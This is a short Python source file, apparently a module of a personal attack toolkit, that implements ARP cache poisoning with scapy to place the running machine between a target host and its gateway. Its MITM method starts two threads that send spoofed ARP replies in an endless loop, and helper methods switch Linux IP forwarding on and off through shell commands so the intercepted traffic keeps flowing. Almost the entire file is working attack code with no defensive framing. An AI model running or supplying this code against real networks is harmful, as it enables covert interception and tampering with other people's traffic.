#!/usr/bin/python

# Author: Tristan Strathearn
# Website: www.r3oath.com
# Email: r3oath@gmail.com

# Licensed under Creative Commons Attribution-ShareAlike 3.0 Unported (CC BY-SA 3.0)
# See the full license at http://creativecommons.org/licenses/by-sa/3.0/legalcode

import E4, thread, subprocess
from scapy.all import *

class Arp():
    def __init__(self):
        pass

    def MITM(self, target, gateway):
        thread.start_new_thread(E4ArpPoison, (target.getIP(), gateway.getIP(),))
        thread.start_new_thread(E4ArpPoison, (gateway.getIP(), target.getIP(),))

    def forward(self, toggle):
        self.linuxStartForwarding() if toggle == True else self.linuxStopForwarding()

    def linuxStartForwarding(self):
        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

    def linuxStopForwarding(self):
        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)

def E4ArpPoison(addressOne, addressTwo, interval=1):
    ArpPacket = ARP(pdst=addressOne, psrc=addressTwo)
    send(ArpPacket, verbose=0, inter=interval, loop=1)